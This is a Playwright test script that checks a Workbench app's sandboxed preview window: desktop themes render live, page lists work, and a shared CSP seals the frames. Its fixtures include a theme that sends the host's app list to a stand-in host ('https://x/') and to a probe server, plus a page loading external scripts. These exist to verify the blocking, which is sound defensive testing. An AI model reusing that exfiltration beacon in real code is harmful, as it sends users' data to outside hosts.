#!/usr/bin/env python3
"""Gate: the Workbench's open-version window — a desktop design renders live,
and a run that made several pages offers them as a list.

Project 251: a run built an animated desktop theme and
its run card's preview showed "a plain black desktop". The window mounts the
preview route's HTML as srcdoc of a sandbox="allow-scripts" frame — a live
page, not a screenshot. A desktop design reads window.CSeriesDesktop from its
first script line (desktop_contract: the shell injects the bridge "before your
scripts run"); nothing injected it here, so the design threw on that line and
only its background painted. The Designs shelf and the Artifacts window give
such a document the inert stand-in from /js/desktop-preview.js; the Workbench
now does the same.

Driven against the BUILT app (system-apps/workbench/index.html, which is the
book of pages) over a loopback mock kernel that serves the real /js/desktop-preview.js, with
the platform's own animated desktop template (desktop_contract.TEMPLATE_HTML)
as the run's output. The book opens on the project's page, and every window
here is opened from the book's right side, under "This page", where the
bench's sections are: a run from its card in the Runs log (closed until
opened), a module version from Modules. The window is the same component the
rail layout opened (components/workbench/version-view.tsx), so what follows
asserts what it always did. The book adds one check, that the window shows in
front of the page (W, M): in the rail layout nothing could cover it.

  W. a run card's open version draws the design: one tile per installed app,
     its canvas lit AND changing between two samples (it animates; it is not a
     first frame), and the stand-in is inert (launch answers false);
  M. a module version that is a desktop design draws the same way;
  P. a page that is NOT a desktop design is mounted untouched — no stand-in;
  F. with /js/desktop-preview.js missing, the window still shows the page (the
     stand-in is a picture aid, not a security control, so nothing fails
     closed) — and the design is back to its bare background, which is the
     control proving W is the stand-in's doing;
  L. a run whose preview answers 300 with several pages (project
     251: five themes) shows the list, opens the page the person picks via
     ?entry=, and switches pages from the header — nothing is picked for them;
  S. SEALED: a page that loads an external script, image
     and fetch() is mounted under the shared sandbox CSP (/js/sandbox-csp.js,
     the real file) — the script does not run, nothing reaches the probe server
     (a second loopback port, i.e. another origin), the page's own inline
     script still runs, and a notice names what was blocked;
  N. a self-contained page renders normally, under the policy, with no notice;
  X. MUTATION CONTROL: the same page with a policy that seals nothing (served
     in place of sandbox-csp.js) DOES reach the probe — proof that S would go
     red if the Workbench stopped sealing;
  Z. with sandbox-csp.js missing the window FAILS CLOSED: no frame, and it
     says the policy did not load;
  B. a DESKTOP design is sealed too: a theme
     that runs navigator.sendBeacon('https://x/', JSON.stringify(
     CSeriesDesktop.apps)) is blocked — the frame reports the connect-src
     violation for https://x/, and the same beacon aimed at the probe never
     arrives; with the mutant policy it DOES arrive, carrying the app names;
  R. The default: when the server opens the root among several changed
     pages (X-Preview-Entries), the window shows it at once — no list — and the
     switcher offers all of them, starting on the root.

Needs Playwright + Chromium and a free local port — no pod, no DB. Run:

  python3 scripts/test_workbench_version_view.py
"""
from __future__ import annotations

import json
import os
import re
import socket
import sys
import threading
import time
from pathlib import Path

from playwright.sync_api import expect, sync_playwright

ROOT = Path(os.environ.get("APP_ROOT") or Path(__file__).resolve().parents[1])
APP_DIR = ROOT / "system-apps" / "workbench"
PREVIEW_JS = ROOT / "dashboard" / "base" / "js" / "desktop-preview.js"
SHOTS = Path(os.environ.get("SHOTS_DIR", "/tmp/wb-version-view"))
SHOTS.mkdir(parents=True, exist_ok=True)
sys.path.insert(0, str(ROOT))
from server.applications.desktop_contract import TEMPLATE_HTML  # noqa: E402

fails = 0


def check(name, ok, detail=""):
    global fails
    print(("  ok    " if ok else "  FAIL  ") + name + (f"  — {detail}" if detail and not ok else ""))
    if not ok:
        fails += 1


# ── the mock kernel ──────────────────────────────────────────────────────────
from fastapi import FastAPI  # noqa: E402
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response, StreamingResponse  # noqa: E402
import uvicorn  # noqa: E402
from gate_loopback import IDLE_KEEP_ALIVE_S  # noqa: E402

NOW = "2026-09-30T21:17:00Z"
APPS = [{"id": "circles", "name": "Circles"}, {"id": "workbench", "name": "Workbench"},
        {"id": "designs", "name": "Designs"}, {"id": "files", "name": "Files"}]
# A plain page that reports whether anything was injected into it.
PLAIN = ("<!doctype html><html><body><h1 id='t'>plain page</h1><script>"
         "document.getElementById('t').dataset.bridge = typeof window.CSeriesDesktop;"
         "</script></body></html>")
# How /js/sandbox-csp.js is served: the real shared file, a mutant that seals
# nothing (the control), or not at all (fail-closed).
SERVE_POLICY = {"mode": "real"}
POLICY_JS = ROOT / "dashboard" / "base" / "js" / "sandbox-csp.js"
MUTANT_POLICY = ("window.CSeriesSandbox={CSP:'',META:'',withSandboxCsp:function(h){return String(h)},"
                 "externalRefs:function(){return []}};")

# The "outside world": a second loopback server = a different origin. Every
# request it sees is a leak out of the preview frame.
import http.server  # noqa: E402

PROBE_HITS: list = []


class _Probe(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        PROBE_HITS.append(self.path + " " + self.rfile.read(n).decode("utf-8", "replace"))
        self.send_response(204)
        self.end_headers()

    def do_GET(self):
        PROBE_HITS.append(self.path)
        body = b"window.__probe_ran = 1;" if self.path.startswith("/probe.js") else b""
        self.send_response(200)
        self.send_header("Content-Type", "text/javascript" if body else "image/png")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def _probe_port() -> int:
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Probe)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv.server_address[1]


PROBE_PORT = _probe_port()
EXTERNAL = (
    "<!doctype html><html><body><h1 id='t'>a page that reaches out</h1>"
    f"<script src='http://127.0.0.1:{PROBE_PORT}/probe.js'></script>"
    f"<img src='http://127.0.0.1:{PROBE_PORT}/img.png' alt=''>"
    "<script>document.getElementById('t').dataset.inline = 'ran';"
    f"try {{ fetch('http://127.0.0.1:{PROBE_PORT}/beacon').catch(function () {{}}); }} catch (e) {{}}"
    "</script></body></html>")

# A harness-written DESKTOP theme that tries to send the Host's app list out —
# the exfiltration shape, twice: to https://x/ (the literal
# case; its block is read from the frame's own CSP violation report) and to
# the probe (so a leak would be SEEN).
BEACON_DESK = (
    "<!doctype html><html><head><meta name='cseries-desktop' content='desktop'></head><body>"
    "<div id='apps' data-cseries-apps></div><script>"
    "window.__violations = [];"
    "document.addEventListener('securitypolicyviolation', function (e) {"
    "  window.__violations.push(e.blockedURI + ' ' + e.effectiveDirective); });"
    "CSeriesDesktop.on(function () {"
    "  window.__apps = CSeriesDesktop.apps.length;"
    "  navigator.sendBeacon('https://x/', JSON.stringify(CSeriesDesktop.apps));"
    f"  navigator.sendBeacon('http://127.0.0.1:{PROBE_PORT}/apps', JSON.stringify(CSeriesDesktop.apps));"
    "});</script></body></html>")
ROOT_PAGES = ["about/index.html", "blog/index.html", "index.html"]

RUNS = {
    "sess-desk": {"id": 801, "harness": "claude-code", "doc": TEMPLATE_HTML},
    "sess-page": {"id": 802, "harness": "kimi", "doc": PLAIN},
    "sess-many": {"id": 803, "harness": "codex", "doc": None},
    "sess-ext": {"id": 804, "harness": "grok", "doc": EXTERNAL},
    "sess-beacon": {"id": 805, "harness": "cursor", "doc": BEACON_DESK},
    "sess-root": {"id": 806, "harness": "opencode", "doc": None},
}
MANY = ["themes/elm-lantern/index.html", "themes/graveyard-shift/index.html",
        "themes/seance/index.html"]
PREVIEW_ASKS: list = []
SERVE_PREVIEW_JS = {"on": True}

app = FastAPI()


# The one page in the book, with the page marks the book's list reads
# (scripts/test_workbench_book.py wire(): nothing landed, nothing waiting).
PROJECT = {"id": 251, "name": "Halloween themes", "status": "active", "group": "active",
           "bucket_id": None, "sort_order": None, "description": "", "phase_count": 0,
           "repo": None, "code_on_machine": False, "step_in_flight_title": None,
           "last_activity_at": NOW, "seen_at": NOW, "last_landed_at": None, "unseen_landed_at": None,
           "ask_cards_open": 0, "approvals_waiting": 0, "waiting_on_you": 0, "approvals_checked_at": None}


@app.get("/api/projects")
def list_projects(include_archived: bool = False, limit: int = 50):
    return {"projects": [dict(PROJECT)], "offset": 0, "next_offset": None}


# The book's boot: the page last open, its seen mark, what the page shows at
# its top, and the running turns (none).
@app.get("/api/projects/last-open")
def last_open():
    return {"ref": str(PROJECT["id"])}


@app.put("/api/projects/last-open")
def put_last_open():
    return {"ref": str(PROJECT["id"])}


@app.put("/api/projects/{pid}/seen")
def seen(pid: int):
    return {"project_id": pid, "seen_at": NOW}


@app.get("/api/projects/{pid}/page")
def project_page(pid: int):
    return {"project_id": pid, "scope": {"kind": "workbench", "ref": str(pid)}, "where_this_stands": None,
            "totals": None, "engines": None,
            **{k: PROJECT[k] for k in ("seen_at", "last_landed_at", "unseen_landed_at", "waiting_on_you",
                                       "ask_cards_open", "approvals_waiting", "approvals_checked_at")}}


@app.get("/api/brain/turns/active")
def turns_active(project_id: int | None = None):
    return {"ok": True, "turn": None, "turns": []}


@app.get("/api/workbench/approvals")
def approvals(project_id: int):
    return {"connected": True, "repo": None, "approvals": []}


@app.get("/api/projects/buckets")
def list_buckets():
    return {"buckets": [], "unfiled": {"counts": {}}}


@app.get("/api/projects/{pid}/modules")
def modules(pid: int):
    return {"project_id": pid, "root_app": None, "modules": [
        {"name": "theme", "target": "private_app", "validation": "review", "description": "",
         "current_version": {"number": 1, "run_id": 801, "commit": "858d531", "source": "build", "at": NOW},
         "version_count": 1, "app": None, "candidates": []}]}


@app.get("/api/projects/{pid}/modules/{mod}/versions")
def versions(pid: int, mod: str):
    return {"versions": [{"number": 1, "run_id": 801, "commit": "858d531", "source": "build", "note": "",
                          "current": True, "restorable": True, "undone": False, "at": NOW}]}


@app.get("/api/projects/{pid}/phases")
def phases(pid: int):
    return {"phases": []}


@app.get("/api/projects/{pid}/preview")
def project_preview(pid: int, module: str = "", version: int | None = None):
    return HTMLResponse(TEMPLATE_HTML)


@app.get("/api/compute/runs")
def runs(project_id: int | None = None, window: str = "", limit: int = 40):
    return {"runs": [
        {"id": r["id"], "session_id": sid, "project_id": 251, "project_name": "Halloween themes",
         "harness": r["harness"], "model": None, "ok": True, "status": "active", "exit_code": 0,
         "has_error": False, "diff_bytes": 10, "elapsed_s": 30, "created_at": NOW}
        for sid, r in RUNS.items()]}


@app.get("/api/review/sessions/{sid}")
def session(sid: str):
    r = RUNS.get(sid)
    if not r:
        return JSONResponse({"detail": "session not found"}, status_code=404)
    return {"session_id": sid, "status": "complete",
            "manifest": {"harnesses": [r["harness"]], "project_id": 251, "prompt": "a desktop theme",
                         "module": "theme", "seeded": True},
            "entrypoints": {r["harness"]: True}}


@app.get("/api/review/sessions/{sid}/stream/{harness}")
async def stream(sid: str, harness: str, from_seq: int = 0):
    async def gen():
        if from_seq <= 1:
            yield json.dumps({"seq": 1, "kind": "text", "payload": {"text": f"{harness} working"}}) + "\n"
        yield json.dumps({"seq": 2, "kind": "status", "payload": {
            "state": "complete", "ok": True, "exit_code": 0, "elapsed_seconds": 30}}) + "\n"
    return StreamingResponse(gen(), media_type="application/x-ndjson")


@app.get("/api/review/sessions/{sid}/preview/{harness}")
def run_preview(sid: str, harness: str, entry: str | None = None):
    PREVIEW_ASKS.append((sid, entry))
    if sid == "sess-root":
        # The kernel's answer when the root is among several changed pages
        # (review.preview_harness_index + entry_pages.choice_headers).
        if entry is None:
            return HTMLResponse("<html><body><h1 id='t'>PAGE:index.html</h1></body></html>", headers={
                "X-Preview-Entries": json.dumps(ROOT_PAGES), "X-Preview-Entry": json.dumps("index.html")})
        return HTMLResponse(f"<html><body><h1 id='t'>PAGE:{entry}</h1></body></html>")
    if sid == "sess-many":
        # The kernel's answer for several candidate pages (review.preview_harness_index).
        if entry is None:
            return JSONResponse(status_code=300, content={
                "detail": "this run changed 3 pages — choose one to open",
                "entries": MANY, "basis": "changed"})
        if entry not in MANY:
            return JSONResponse({"detail": "not a page"}, status_code=404)
        return HTMLResponse(f"<html><body><h1 id='t'>PAGE:{entry}</h1></body></html>")
    return HTMLResponse(RUNS[sid]["doc"])


@app.get("/api/review/sessions/{sid}/diff/{harness}")
def run_diff(sid: str, harness: str):
    return {"diff": "diff --git a/themes/x/index.html b/themes/x/index.html\n+<canvas>\n"}


@app.get("/api/applications")
def applications():
    return {"applications": APPS}


@app.get("/api/review/sessions")
def sessions(project_id: int | None = None, limit: int = 20):
    return {"sessions": []}


@app.get("/api/agents")
def agents(limit: int = 100, active_only: bool = False):
    return {"agents": []}


@app.get("/api/agents/scheduled")
def scheduled():
    return {"scheduled": []}


@app.get("/api/brain/chat")
def chat(app_id: str = "", project_id: int | None = None, order: str = "asc"):
    return {"turns": []}


@app.get("/css/tokens.css")
def tokens():
    return Response(":root{}", media_type="text/css")


@app.get("/js/desktop-preview.js")
def preview_js():
    if not SERVE_PREVIEW_JS["on"]:
        return Response(status_code=404)
    return FileResponse(str(PREVIEW_JS), media_type="text/javascript")


@app.get("/js/sandbox-csp.js")
def policy_js():
    if SERVE_POLICY["mode"] == "missing":
        return Response(status_code=404)
    if SERVE_POLICY["mode"] == "mutant":
        return Response(MUTANT_POLICY, media_type="text/javascript")
    return FileResponse(str(POLICY_JS), media_type="text/javascript")


@app.api_route("/api/{rest:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE"])
def other_api(rest: str):
    return JSONResponse({"detail": "not mocked"}, status_code=404)


@app.get("/system-apps/workbench/{rest:path}")
def static(rest: str):
    target = (APP_DIR / rest).resolve()
    if APP_DIR.resolve() not in target.parents and target != APP_DIR.resolve():
        return Response(status_code=403)
    if target.is_file():
        return FileResponse(str(target))
    return Response(status_code=404)


def serve() -> int:
    # Loopback on purpose: the only client is the headless Chromium this same
    # process launches on this same box.
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=port, log_level="error",
                                           timeout_keep_alive=IDLE_KEEP_ALIVE_S))
    threading.Thread(target=server.run, daemon=True).start()
    deadline = time.time() + 10
    while not server.started and time.time() < deadline:
        time.sleep(0.05)
    return port


# ── helpers ──────────────────────────────────────────────────────────────────
# The book (src/book/book-app.tsx): the page in front, by its id (the copy a
# page turn lays over it drops the id), and the right side, where "This page"
# sits above the bench's sections (components/workbench/ops-pane.tsx in its
# "page" chrome: Modules, Plan, Runs, Code Approvals, Ship this project).
PAGE_TITLE = "#book-page > .book-inner > h1.book-title"
RIGHT = "aside.book-right"

# Lit pixels in the design's canvas and a cheap digest of them: the canvas is
# the design's own drawing, so this reads what the design drew, not the page
# chrome around it.
CANVAS_PROBE = """() => {
  const c = document.querySelector('canvas');
  if (!c || !c.width || !c.height) return {lit: 0, sum: 0};
  const d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
  let lit = 0, sum = 0;
  for (let i = 0; i < d.length; i += 4) { if (d[i + 3] > 0) { lit++; sum = (sum + d[i] * 3 + d[i + 1] * 5 + d[i + 2] * 7 + i) % 1000000007; } }
  return {lit, sum};
}"""


def open_app(page, base):
    """The book, open on the project's page, with its right side read."""
    page.goto(f"{base}/system-apps/workbench/index.html", wait_until="domcontentloaded", timeout=15_000)
    expect(page.locator(PAGE_TITLE)).to_have_text(PROJECT["name"], timeout=10_000)
    right = page.locator(RIGHT)
    expect(right.locator("[data-module='theme']")).to_be_visible(timeout=8_000)
    return right


def run_card(page, base, harness):
    """The run's card on the right side, landed: the Runs log (closed until
    opened), the run's row by its number, then its card with Open version
    enabled."""
    right = open_app(page, base)
    right.locator("button[data-state]").filter(has_text=re.compile(r"^\s*Runs")).first.click()
    rid = next(r["id"] for r in RUNS.values() if r["harness"] == harness)
    right.locator("button").filter(has_text=f"#{rid}").first.click()
    term = right.locator(f"[data-run-card][data-harness='{harness}']").first
    expect(term.locator("[data-open-version]:not([disabled])")).to_have_count(1, timeout=8_000)
    return term


# Is the window what shows, in front of the page? The checks that read its
# frame's document pass whether or not something covers the window, so this
# asks the page what is on top at the window's centre and near two of its
# corners. Opened from the right side, the window is inside aside.book-right,
# and the book's page and tabs are drawn beside that.
IN_FRONT = """() => {
  const vv = document.querySelector("[data-testid='version-view']");
  if (!vv) return {ok: false, hits: ['no window']};
  const r = vv.getBoundingClientRect();
  const pts = [[r.left + r.width / 2, r.top + r.height / 2], [r.left + 40, r.top + 60],
               [r.right - 40, r.bottom - 40]];
  const hits = pts.map(([x, y]) => {
    const e = document.elementFromPoint(x, y);
    if (!e) return 'nothing';
    if (vv.contains(e)) return 'window';
    return e.tagName.toLowerCase() + (e.id ? '#' + e.id : '') + '.' + String(e.className || '').split(' ')[0];
  });
  return {ok: hits.every((h) => h === 'window'), hits};
}"""


def in_front(page, label):
    got = page.evaluate(IN_FRONT)
    check(f"{label}: the window shows in front of the page (nothing of the book covers it)", got["ok"], repr(got))


def preview_frame(page):
    """The version window's frame, once it has a document with a body."""
    vv = page.locator("[data-testid='version-view']")
    expect(vv.locator("iframe")).to_be_visible(timeout=8_000)
    handle = vv.locator("iframe").element_handle()
    frame = handle.content_frame()
    deadline = time.time() + 5
    while frame is None and time.time() < deadline:
        time.sleep(0.05)
        frame = handle.content_frame()
    frame.wait_for_load_state("load", timeout=5_000)
    return vv, frame


def open_run(page, base, harness):
    term = run_card(page, base, harness)
    term.locator("[data-open-version]").click()
    return preview_frame(page)


def draws_live(frame, label):
    """The design drew its grid and its canvas is lit and changing."""
    frame.wait_for_timeout(400)
    tiles = frame.locator("[data-cseries-app]").count()
    check(f"{label}: one tile per installed app ({len(APPS)})", tiles == len(APPS), f"{tiles} tile(s)")
    a = frame.evaluate(CANVAS_PROBE)
    frame.wait_for_timeout(500)
    b = frame.evaluate(CANVAS_PROBE)
    check(f"{label}: the design's canvas is drawn (not a bare background)", a["lit"] > 0 and b["lit"] > 0,
          repr((a, b)))
    check(f"{label}: it animates — two samples 500 ms apart differ", a["sum"] != b["sum"], repr((a, b)))
    check(f"{label}: the stand-in is inert (launch answers false)",
          frame.evaluate("() => window.CSeriesDesktop && window.CSeriesDesktop.launch('circles')") is False)


# ── scenarios ────────────────────────────────────────────────────────────────
def scenario_run_card(page, base):
    print("W. a run card's open version draws a desktop design, live")
    vv, frame = open_run(page, base, "claude-code")
    draws_live(frame, "W")
    in_front(page, "W")
    page.screenshot(path=str(SHOTS / "W-run-desktop.png"))


def scenario_module_version(page, base):
    print("M. a module version that is a desktop design draws the same way")
    right = open_app(page, base)
    card = right.locator("[data-module='theme']")
    card.locator("button").first.click()
    expect(card.locator("[data-version='1']")).to_be_visible(timeout=3_000)
    card.locator("[data-version='1'] [data-open-version]").click()
    vv, frame = preview_frame(page)
    draws_live(frame, "M")
    in_front(page, "M")
    page.screenshot(path=str(SHOTS / "M-module-desktop.png"))


def scenario_plain_page(page, base):
    print("P. a page that is not a desktop design is mounted untouched")
    vv, frame = open_run(page, base, "kimi")
    expect(frame.locator("#t")).to_have_text("plain page", timeout=3_000)
    check("P: nothing was injected (window.CSeriesDesktop is undefined in the page)",
          frame.locator("#t").get_attribute("data-bridge") == "undefined",
          frame.locator("#t").get_attribute("data-bridge"))
    check("P: no stand-in script in the document",
          frame.locator("script[data-cseries-desktop]").count() == 0)


def scenario_no_stand_in(page, base):
    print("F. without /js/desktop-preview.js the window still shows the page, bare")
    SERVE_PREVIEW_JS["on"] = False
    try:
        vv, frame = open_run(page, base, "claude-code")
        check("F: the version window still mounts the design", frame is not None)
        frame.wait_for_timeout(400)
        check("F: control — without the stand-in the design draws no tiles",
              frame.locator("[data-cseries-app]").count() == 0)
        a = frame.evaluate(CANVAS_PROBE)
        check("F: control — and its canvas stays empty (the 'plain black desktop')", a["lit"] == 0, repr(a))
        page.screenshot(path=str(SHOTS / "F-no-stand-in.png"))
    finally:
        SERVE_PREVIEW_JS["on"] = True


def scenario_page_list(page, base):
    print("L. a run that made several pages offers them as a list")
    PREVIEW_ASKS.clear()
    term = run_card(page, base, "codex")
    term.locator("[data-open-version]").click()
    vv = page.locator("[data-testid='version-view']")
    choices = vv.locator("[data-entry-choices]")
    expect(choices).to_be_visible(timeout=5_000)
    got = choices.locator("[data-entry]").evaluate_all("els => els.map(e => e.dataset.entry)")
    check("L: the window lists every page the run made, in the server's order", got == MANY, repr(got))
    check("L: nothing is opened until the person picks", vv.locator("iframe").count() == 0)
    check("L: the server's sentence says why there is a list",
          "changed 3 pages" in (choices.text_content() or ""), choices.text_content())
    choices.locator("[data-entry='themes/seance/index.html']").click()
    frame = vv.frame_locator("iframe")
    expect(frame.locator("#t")).to_have_text("PAGE:themes/seance/index.html", timeout=5_000)
    check("L: the chosen page opens (?entry= carries the choice)",
          ("sess-many", "themes/seance/index.html") in PREVIEW_ASKS, repr(PREVIEW_ASKS))
    switch = vv.locator("select[data-entry-switch]")
    check("L: a switcher in the header offers the other pages", switch.count() == 1)
    switch.select_option("themes/elm-lantern/index.html")
    expect(frame.locator("#t")).to_have_text("PAGE:themes/elm-lantern/index.html", timeout=5_000)
    check("L: switching opens that page", True)
    page.screenshot(path=str(SHOTS / "L-page-list.png"))


def _leaks(frame) -> tuple:
    """What reached the outside after the page had time to try."""
    frame.wait_for_timeout(900)
    return (frame.evaluate("() => window.__probe_ran === 1"), list(PROBE_HITS))


def scenario_sealed(page, base):
    print("S. a page that reaches outside is sealed, and the notice says what was blocked")
    PROBE_HITS.clear()
    vv, frame = open_run(page, base, "grok")
    expect(frame.locator("#t")).to_have_attribute("data-inline", "ran", timeout=5_000)
    check("S: the page itself renders, its own inline script runs", True)
    ran, hits = _leaks(frame)
    check("S: the external script does NOT run", ran is False, repr(ran))
    check("S: nothing reached the outside (script, image, fetch)", hits == [], repr(hits))
    check("S: the frame carries the shared policy",
          frame.locator("meta[http-equiv='Content-Security-Policy']").count() == 1)
    # The CSP covers the page's own requests, not the app's: a frame given
    # allow-same-origin could call the Workbench's own fetch and reach its API
    # with every check above still green. The page's origin is
    # what proves the sandbox held.
    origin = frame.evaluate("() => self.origin")
    check("S: the page has an opaque origin — it cannot reach the Workbench's session",
          origin == "null", repr(origin))
    note = vv.locator("[data-blocked-refs]")
    text = note.text_content() if note.count() else ""
    check("S: a notice names what was blocked",
          note.count() == 1 and f"127.0.0.1:{PROBE_PORT}/probe.js" in text
          and "2 external references were blocked" in text, repr(text))
    page.screenshot(path=str(SHOTS / "S-sealed.png"))


def scenario_self_contained(page, base):
    print("N. a self-contained page renders normally, sealed, with no notice")
    vv, frame = open_run(page, base, "kimi")
    expect(frame.locator("#t")).to_have_text("plain page", timeout=3_000)
    check("N: its inline script ran under the policy",
          frame.locator("#t").get_attribute("data-bridge") == "undefined")
    check("N: it is sealed too", frame.locator("meta[http-equiv='Content-Security-Policy']").count() == 1)
    check("N: and there is no notice", vv.locator("[data-blocked-refs]").count() == 0)


def scenario_mutant_policy(page, base):
    print("X. mutation control: a policy that seals nothing lets the same page out")
    PROBE_HITS.clear()
    SERVE_POLICY["mode"] = "mutant"
    try:
        vv, frame = open_run(page, base, "grok")
        ran, hits = _leaks(frame)
        check("X: unsealed, the external script DOES run — the probe can see a leak",
              ran is True and any(h.startswith("/probe.js") for h in hits), repr((ran, hits)))
        check("X: ...and the fetch() reaches the outside too",
              any(h.startswith("/beacon") for h in hits), repr(hits))
    finally:
        SERVE_POLICY["mode"] = "real"
        PROBE_HITS.clear()


def scenario_policy_missing(page, base):
    print("Z. without sandbox-csp.js the window fails closed")
    SERVE_POLICY["mode"] = "missing"
    try:
        term = run_card(page, base, "grok")
        # The card loads the landed version by itself (workbench 0.24.0), so
        # it must fail closed the same way the window does.
        expect(term.locator("[data-run-preview]")).to_contain_text("did not load", timeout=5_000)
        check("Z: the card's inline version fails closed too, and mounts no frame",
              term.locator("[data-run-preview] iframe").count() == 0)
        term.locator("[data-open-version]").click()
        vv = page.locator("[data-testid='version-view']")
        expect(vv).to_contain_text("did not load", timeout=5_000)
        check("Z: it says the policy did not load", True)
        check("Z: and mounts no frame at all", vv.locator("iframe").count() == 0)
    finally:
        SERVE_POLICY["mode"] = "real"


def scenario_desktop_beacon(page, base):
    print("B. a desktop theme cannot beacon the Host's apps out")
    PROBE_HITS.clear()
    vv, frame = open_run(page, base, "cursor")
    frame.wait_for_timeout(900)
    apps = frame.evaluate("() => window.__apps")
    check("B: the theme had the Host's apps in hand (the stand-in gave it them)",
          apps == len(APPS), repr(apps))
    viol = frame.evaluate("() => window.__violations")
    check("B: sendBeacon('https://x/', JSON.stringify(CSeriesDesktop.apps)) is blocked by connect-src",
          any(v.startswith("https://x") and "connect-src" in v for v in viol), repr(viol))
    check("B: and the same beacon aimed at the probe never arrives",
          not any(h.startswith("/apps") for h in PROBE_HITS), repr(PROBE_HITS))
    check("B: the desktop frame carries the shared policy",
          frame.locator("meta[http-equiv='Content-Security-Policy']").count() == 1)
    # The control runs in a FRESH context: the page above already holds the
    # real /js/sandbox-csp.js in its cache, and a reload would keep using it.
    PROBE_HITS.clear()
    SERVE_POLICY["mode"] = "mutant"
    ctx = page.context.browser.new_context(viewport={"width": 1500, "height": 950})
    try:
        vv, frame = open_run(ctx.new_page(), base, "cursor")
        frame.wait_for_timeout(900)
        got = [h for h in PROBE_HITS if h.startswith("/apps")]
        check("B: CONTROL — unsealed, the beacon DOES leave with the app names",
              bool(got) and "Circles" in got[0], repr(PROBE_HITS))
    finally:
        ctx.close()
        SERVE_POLICY["mode"] = "real"
        PROBE_HITS.clear()


def scenario_root_default(page, base):
    print("R. the root among several changed pages opens at once, the switcher lists them all")
    PREVIEW_ASKS.clear()
    run_card(page, base, "opencode").locator("[data-open-version]").click()
    vv = page.locator("[data-testid='version-view']")
    frame = vv.frame_locator("iframe")
    expect(frame.locator("#t")).to_have_text("PAGE:index.html", timeout=5_000)
    check("R: the root opens directly — no list to choose from",
          vv.locator("[data-entry-choices]").count() == 0)
    switch = vv.locator("select[data-entry-switch]")
    opts = switch.locator("option").evaluate_all("els => els.map(e => e.value)") if switch.count() else []
    check("R: the switcher lists all three pages", opts == ROOT_PAGES, repr(opts))
    check("R: ...starting on the root", switch.count() == 1 and switch.input_value() == "index.html",
          switch.input_value() if switch.count() else "no switcher")
    switch.select_option("about/index.html")
    expect(frame.locator("#t")).to_have_text("PAGE:about/index.html", timeout=5_000)
    check("R: switching opens that page (?entry=)",
          ("sess-root", "about/index.html") in PREVIEW_ASKS, repr(PREVIEW_ASKS))
    page.screenshot(path=str(SHOTS / "R-root-default.png"))


def main():
    if not (APP_DIR / "index.html").is_file():
        print(f"FAIL  no built app at {APP_DIR} — run `npm run ship` in workbench-web/")
        return 1
    port = serve()
    base = f"http://127.0.0.1:{port}"
    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        for fn in (scenario_run_card, scenario_module_version, scenario_plain_page, scenario_no_stand_in,
                   scenario_page_list, scenario_sealed, scenario_self_contained,
                   scenario_mutant_policy, scenario_policy_missing,
                   scenario_desktop_beacon, scenario_root_default):
            ctx = browser.new_context(viewport={"width": 1500, "height": 950})
            page = ctx.new_page()
            errors = []
            page.on("pageerror", lambda e: errors.append(str(e)))
            try:
                fn(page, base)
            except Exception as e:  # a scenario that throws is a failed gate, not a crash
                check(f"{fn.__name__}: completed", False, f"{type(e).__name__}: {e}")
                page.screenshot(path=str(SHOTS / f"{fn.__name__}-error.png"))
            if fn is not scenario_no_stand_in:
                check(f"{fn.__name__}: no uncaught page errors", not errors, "; ".join(errors)[:300])
            ctx.close()
        browser.close()
    print("\nPASS workbench_version_view" if not fails else f"\nFAIL workbench_version_view: {fails} check(s)")
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
